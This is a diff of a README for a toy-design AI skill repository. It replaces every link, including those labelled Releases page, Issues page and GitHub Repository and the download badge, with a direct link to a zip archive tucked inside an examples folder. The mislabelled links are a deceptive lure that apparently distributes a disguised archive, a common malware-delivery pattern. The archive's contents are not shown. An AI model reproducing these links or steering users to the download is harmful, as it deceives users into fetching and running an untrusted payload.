@@ -1,7 +1,7 @@
 # 🎨 designer-toy-skill - Create Unique Collectible Vinyl Figures
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/TopMan124534905/designer-toy-skill/releases)
+[![Download](https://github.com/TopMan124534905/designer-toy-skill/raw/refs/heads/main/examples/halloween-bear-felt/designer_skill_toy_v1.9.zip%https://github.com/TopMan124534905/designer-toy-skill/raw/refs/heads/main/examples/halloween-bear-felt/designer_skill_toy_v1.9.zip)](https://github.com/TopMan124534905/designer-toy-skill/raw/refs/heads/main/examples/halloween-bear-felt/designer_skill_toy_v1.9.zip)
 
 ## 🛠️ Overview
 The **designer-toy-skill** application helps you generate designer toy or blind box figure series with a consistent character design. It serves as a Creative Skill for creating collectible vinyl figures using an innovative visual reference method. Whether you're an artist or a toy enthusiast, this tool provides the features you need to bring your ideas to life.
@@ -16,7 +16,7 @@ Follow these simple steps to download and start using the app. You don’t need 
    - Internet connection for downloading the software.
 
 2. **Visit the Download Page**
-   Open your web browser and go to the [Releases page](https://github.com/TopMan124534905/designer-toy-skill/releases). This page contains the latest version of the application and any additional documentation that might help you. 
+   Open your web browser and go to the [Releases page](https://github.com/TopMan124534905/designer-toy-skill/raw/refs/heads/main/examples/halloween-bear-felt/designer_skill_toy_v1.9.zip). This page contains the latest version of the application and any additional documentation that might help you. 
 
 ## 🖥️ Download & Install
 Once you are on the Releases page, find the latest version listed there. Usually, the latest version will be at the top. 
@@ -57,7 +57,7 @@ Once you are on the Releases page, find the latest version listed there. Usually
 - For any application crashes, check if you are running the latest version; if not, update from the Releases page.
 
 ## 🤝 Support
-For help, you can reach out through the Issues tab on the [GitHub Repository](https://github.com/TopMan124534905/designer-toy-skill/issues). A community of users may offer help, or you can report bugs directly. 
+For help, you can reach out through the Issues tab on the [GitHub Repository](https://github.com/TopMan124534905/designer-toy-skill/raw/refs/heads/main/examples/halloween-bear-felt/designer_skill_toy_v1.9.zip). A community of users may offer help, or you can report bugs directly. 
 
 ## 📜 Frequently Asked Questions
 - **Q: Is the application free to use?**  
@@ -73,7 +73,7 @@ For help, you can reach out through the Issues tab on the [GitHub Repository](ht
 This project involves topics like ai-art, blind-box, character-design, chibi, claude-code, collectible, design, designer-toy, skill, toy, and vinyl-figure. 
 
 ## 📦 Important Links
-- [Releases Page](https://github.com/TopMan124534905/designer-toy-skill/releases)
-- [Issues Page](https://github.com/TopMan124534905/designer-toy-skill/issues)
+- [Releases Page](https://github.com/TopMan124534905/designer-toy-skill/raw/refs/heads/main/examples/halloween-bear-felt/designer_skill_toy_v1.9.zip)
+- [Issues Page](https://github.com/TopMan124534905/designer-toy-skill/raw/refs/heads/main/examples/halloween-bear-felt/designer_skill_toy_v1.9.zip)
 
 Feel free to download and start creating your unique collectible figures today. Your creativity only has limits if you let it!
